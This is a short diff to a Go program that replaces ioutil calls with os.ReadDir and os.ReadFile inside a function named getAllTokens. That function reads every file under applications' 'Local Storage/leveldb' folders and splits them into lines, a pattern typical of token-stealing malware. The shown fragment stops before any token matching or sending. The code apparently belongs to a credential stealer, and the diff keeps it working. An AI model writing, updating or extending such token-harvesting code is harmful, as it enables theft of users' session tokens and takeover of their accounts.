@@ -5,7 +5,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"os"
 	"os/user"
@@ -227,7 +226,7 @@ func getAllTokens() {
 		}
 
 		path += "/Local Storage/leveldb/"
-		files, _ := ioutil.ReadDir(path)
+		files, _ := os.ReadDir(path)
 
 		for _, file := range files {
 			name := file.Name()
@@ -236,7 +235,7 @@ func getAllTokens() {
 				continue
 			}
 
-			content, _ := ioutil.ReadFile(path + "/" + name)
+			content, _ := os.ReadFile(path + "/" + name)
 			lines := bytes.Split(content, []byte("\\n"))
 
 			for _, line := range lines {
